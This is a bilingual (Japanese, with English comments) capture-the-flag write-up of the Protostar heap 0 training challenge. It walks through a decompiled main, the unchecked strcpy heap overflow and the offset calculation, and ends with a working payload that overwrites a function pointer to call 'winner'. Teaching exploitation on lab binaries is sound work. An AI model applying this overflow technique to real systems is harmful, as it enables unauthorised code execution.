# protostar heap 0

<!-- Let's take a look at the binary. Also this challenge is a bit different from the others, the goal is to run the `winner` function. Also I recompiled this challenge from source: -->
バイナリを見てみましょう。
また、このチャレンジは他のチャレンジとは少し異なり、ゴールは `winner` 関数を実行することです。
また、私はこのチャレンジをソースから再コンパイルしました。

```
$    file heap0
heap0: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=ca0d25fb47b05e42811810bf08e5376b33f64501, not stripped
$    pwn checksec heap0
[*] '/Hackery/pod/modules/heap_overflow/protostart_heap0/heap0'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
$    ./heap0
data is at 0x56fde160, fp is at 0x56fde1b0
Segmentation fault (core dumped)
$    ./heap0 15935728
data is at 0x56c08160, fp is at 0x56c081b0
level has not been passed
```

<!-- So we can see it prints out what looks like two heap addresses, and takes in input as an argument. In addition to that we see that there is no PIE, and it is a 32 bit binary. When we take a look at the main function in Ghidra, we see this: -->
つまり、2つのヒープアドレスのようなものを出力し、引数として入力を受け取っていることがわかります。
さらに、PIEがないこと、32ビットバイナリであることもわかります。
Ghidraのmain関数を見てみましょう:

```
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(undefined4 param_1,int param_2)

{
  char *ptr0;
  undefined **ptr1;
 
  ptr0 = (char *)malloc(0x40);
  ptr1 = (undefined **)malloc(4);
  *(code **)ptr1 = nowinner;
  printf("data is at %p, fp is at %p\n",ptr0,ptr1);
  strcpy(ptr0,*(char **)(param_2 + 4));
  (*(code *)*ptr1)();
  return 0;
}
```

<!-- So we can see a few things. First that it allocates two separate heap chunks, one `0x40` bytes big and the other just `4` bytes (`ptr0` and `ptr1`). Then it sets `ptr1` equal to the function `nowinner`. After that it prints the value of `ptr0` and `ptr1` (so that is where our two heap addresses come from). Proceeding that it copies over the input we gave it via an argument to `ptr0`, however doesn't check for an overflow. This gives us a heap overflow bug. Proceeding that it executes the address pointed to by `ptr1`. -->
これで、いくつかのことがわかります。
まず、2つの別々のヒープチャンクを確保します。1つは `0x40` バイトの大きさで、もう1つは `4` バイトだけです (`ptr0` と `ptr1`)。
そして、 `ptr1` を関数 `nowinner` と同じ値に設定します。
その後、 `ptr0` と `ptr1` の値を表示します (つまり、これが 2 つのヒープアドレスの由来となります)。
続けて、引数で与えた入力を `ptr0` にコピーしますが、オーバーフローをチェックしません。
これはヒープオーバーフローのバグになります。`ptr1` が指すアドレスを実行します。

<!-- So we have an overflow. With it we will use it to overwrite the value of `ptr1` to be that of the `winner` function. When we ran it, we can see that `ptr0` was at `0x56c08160` and `ptr1` was at `0x56c081b0` (for the second iteration of running it). So after `0x56c081b0 - 0x56c08160 = 0x50` bytes of space between the start of our input and the instruction pointer stored in `ptr1`. Next we need the address of `winner`: -->
つまり、オーバーフローが発生しています。
これを利用して、 `ptr1` の値を `winner` 関数の値に上書きします。
実行すると、`ptr0` の値は `0x56c08160` で、`ptr1` の値は `0x56c081b0` (実行の2回目の繰り返し) であることがわかります。
つまり、 `0x56c081b0 - 0x56c08160 = 0x50` バイトのスペースが、入力の開始点と `ptr1` に格納されている命令ポインタの間にあるわけです。
次に、`winner` のアドレスが必要です。

```
$    objdump -D heap0 | grep winner
080484b6 <winner>:
080484e1 <nowinner>:
```

<!-- With that, we have everything we need to solve the challenge: -->
これさえあれば、チャレンジに必要なものはすべて揃っています。

```
$    ./heap0 `python -c 'print "0"*0x50 + "\xb6\x84\x04\x08"'`
data is at 0x98ac160, fp is at 0x98ac1b0
level passed
```
